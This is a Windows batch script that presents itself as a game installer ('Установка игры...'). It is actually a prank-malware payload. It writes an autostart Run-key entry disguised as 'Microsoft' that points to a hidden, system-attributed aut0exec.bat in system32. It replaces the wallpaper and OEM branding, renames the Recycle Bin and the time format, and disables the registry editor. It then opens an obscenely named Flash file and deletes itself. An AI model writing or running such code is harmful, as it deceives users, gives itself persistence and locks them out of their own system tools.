@echo off   
Chcp 1251 
title Установка игры...   
color 01   
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Microsoft /t REG_SZ /d  C:\\WINDOWS\\system32\\aut0exec.bat /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\WINDOWS\0.bmp /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Toolbar" /v BackBitmap /t REG_SZ /d  C:\WINDOWS\0.bmp /f
reg add "HKEY_USERS\.DEFAULT\Control Panel\Desktop" /v Wallpape /t REG_SZ /d  C:\WINDOWS\0.bmp /f
reg add "HKEY_USERS\.DEFAULT\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\WINDOWS\0.bmp /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /v sTimeFormat /t REG_SZ /d  Чайник /f
reg add "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}" /v LocalizedString /t REG_SZ /d  Чайник /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d  1 /f
copy 0.bat "%systemroot%\system32\aut0exec.bat" 
attrib +h +s "%systemroot%\system32\aut0exec.bat"
copy 0.bmp  "%systemroot%\0.bmp" /y 
attrib +h +s "%systemroot%\0.bmp"
copy 0.bmp  "%systemroot%\system\oemlogo.bmp" /y 
copy 0.bmp  "%systemroot%\system32\net.bmp" /y   
copy 0.ini  "%systemroot%\system\oeminfo.ini" /y   
del 0.*
start/max Долбоёбки.swf
del %0









